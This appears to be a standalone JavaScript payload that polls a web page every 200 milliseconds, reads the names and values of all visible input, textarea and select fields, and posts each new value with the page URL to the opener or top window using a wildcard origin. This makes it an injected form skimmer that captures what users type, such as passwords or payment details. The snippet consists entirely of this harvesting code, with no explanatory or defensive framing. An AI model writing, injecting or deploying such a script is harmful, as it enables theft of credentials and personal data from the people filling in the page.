var found = {};
setInterval(function(){
  /* poll the DOM to check for any new input fields */
  var inputs = document.querySelectorAll('input,textarea,select');
  Array.prototype.forEach.call(inputs, function(input) {
    var val  = input.value||'';
    var name = input.getAttribute('name')||'';
    var t    = input.getAttribute('type')||'';
    if (input.tagName == 'SELECT') {
      try { val = input.querySelector('option:checked').value }
      catch (e) {}
    }
    if (input.tagName == 'INPUT' && t.toLowerCase()=='hidden') return;

    /* check if this is a valid input/value pair */
    try {
      if (val.length && name.length) {
        if (found[name] != val) {

          /* new input/value discovered, remember it and send it up */
          found[name] = val;
          var result = { name: name, value: val, url: window.location.href, send: true };
          alert("RESULT: " + result);
          (opener||top).postMessage(JSON.stringify(result), '*');
        }
      }
    } catch (e) {}
  });
}, 200);
